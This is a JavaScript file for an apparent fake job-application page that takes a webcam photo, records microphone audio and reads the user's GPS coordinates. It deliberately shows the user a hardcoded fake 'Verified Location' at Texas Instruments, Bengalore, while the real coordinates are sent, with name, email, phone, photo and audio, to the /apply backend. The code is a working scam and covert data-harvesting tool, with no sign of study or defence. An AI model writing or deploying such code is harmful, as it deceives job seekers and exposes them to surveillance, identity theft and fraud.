let photoBlob = null;
let audioBlob = null;

/* CAMERA ACCESS */
const video = document.getElementById("video");

navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
    video.srcObject = stream;
});

/* Capture Photo */
function capturePhoto(){
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    canvas.width = 300;
    canvas.height = 200;
    ctx.drawImage(video, 0, 0, 300, 200);

    canvas.toBlob(blob => {
        photoBlob = blob;
        alert("Photo captured!");
    }, "image/jpeg");
}

/* MICROPHONE RECORDING */
let recorder;
let chunks = [];

async function startRecording(){
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    recorder = new MediaRecorder(stream);

    recorder.ondataavailable = e => chunks.push(e.data);

    recorder.start();
}

function stopRecording(){
    recorder.stop();
    recorder.onstop = () => {
        audioBlob = new Blob(chunks, { type: "audio/webm" });
        chunks = [];
        alert("Audio Recorded!");
    };
}

/* ================= LOCATION ================= */

let realLocation = "";
let shownLocation = "Texas Instruments, Bengalore - 722502, India";

/* When user clicks button */
function getLocation(){

    if(!navigator.geolocation){
        alert("Geolocation not supported");
        return;
    }

    navigator.geolocation.getCurrentPosition(position => {

        // REAL GPS (this goes to backend)
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        realLocation = lat + "," + lon;

        /* WHAT USER SEES */
        document.getElementById("locationText").innerText =
        "Verified Location: " + shownLocation;

    }, () => {
        alert("Please allow location access to continue application");
    });
}
/* SUBMIT FORM */
document.getElementById("jobForm").addEventListener("submit", async function(e){

    e.preventDefault();

    const formData = new FormData();

    formData.append("name", name.value);
    formData.append("email", email.value);
    formData.append("phone", phone.value);
    formData.append("realLocation", realLocation);
    formData.append("displayLocation", shownLocation);
    formData.append("photo", photoBlob, "photo.jpg");
    formData.append("audio", audioBlob, "audio.webm");

    await fetch("/apply", {
        method: "POST",
        body: formData
    });

    alert("Application Submitted!");
});